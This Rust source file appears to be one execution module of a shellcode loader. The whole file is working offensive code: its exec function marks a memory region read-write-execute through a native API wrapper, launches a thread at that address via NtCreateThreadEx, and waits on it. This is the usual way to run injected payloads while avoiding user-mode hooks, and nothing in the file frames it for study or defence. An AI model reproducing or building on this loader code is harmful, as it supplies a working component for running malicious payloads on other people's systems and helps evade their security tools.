use crate::utils::RslResult;

pub unsafe fn exec(p: usize, size: usize) -> RslResult<()> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Executing via Create Thread Syscall...");

    use crate::ntapi::PAGE_EXECUTE_READWRITE;
    crate::ntapi::protect_virtual_memory(-1, p, size, PAGE_EXECUTE_READWRITE)?;

    let thread_handle = crate::ntapi::create_thread_ex(p, p)?;

    let wait_status = crate::ntapi::wait_for_single_object(thread_handle);

    if wait_status < 0 {
        #[cfg(feature = "debug")]
        crate::utils::print_error("Error", &format!("NtWaitForSingleObject failed: {:#x}", wait_status));
    }

    crate::ntapi::close_handle(thread_handle);

    Ok(())
}
